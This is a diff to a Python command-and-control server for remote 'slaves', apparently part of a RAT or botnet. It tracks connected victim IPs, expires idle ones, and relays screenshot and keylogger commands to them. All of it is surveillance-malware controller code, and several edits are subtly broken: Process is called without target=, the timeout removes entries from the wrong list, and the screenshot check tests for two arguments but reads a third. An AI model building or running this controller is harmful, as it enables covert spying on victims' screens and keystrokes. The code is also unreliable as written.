@@ -2,15 +2,21 @@ from signal import SIGTERM
 import socket
 import ipaddress
 from multiprocessing import Process, Manager
+from time import sleep, time
 from PIL import Image
 import os
 
 # COMMAND AND CONTROL CODE WILL GO HERE
 
 port = 1234
-ip = '192.168.56.103'
+ip = '127.0.0.1'
+
+def removeSlave(sharedArray, ip):
+    sleep(30)
+    sharedArray.remove(ip)
 
 def runServer(sharedArray, slaves):
+    slavetimeouts = dict()
     #Create listening socket
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((ip, port))
@@ -34,6 +40,11 @@ def runServer(sharedArray, slaves):
                 #Keep list of online slaves
                 if slaves.count(addr[0]) == 0:
                     slaves.append(addr[0])
+                #Set timeout for removal of slave from list
+                if addr[0] in slavetimeouts:
+                    os.kill(slavetimeouts[addr[0]].pid, SIGTERM)
+                slavetimeouts[addr[0]] = Process(removeSlave, args=(sharedArray, addr[0],))
+                slavetimeouts[addr[0]].start()
                     
 #Checks if an ip address is valid 
 def isValidIp(address):
@@ -71,7 +82,11 @@ if __name__ == "__main__":
                 #Convert to bytes for sending to slave
                 sharedArray[:] = command.encode('utf-8')
         elif currentSplit[0] == "screenshot":
-            sharedArray[:] = command.encode('utf-8')
+            if len(currentSplit) < 2 or not slaves.count(currentSplit[2]):
+                print("Invalid argument, should give target ip and target ip should be currently connected")
+                sharedArray.value = b""
+            else:
+                sharedArray[:] = command.encode('utf-8')
         elif currentSplit[0] == "keylogger":
             sharedArray[:] = command.encode('utf-8')
         elif currentSplit[0] == "slaves":
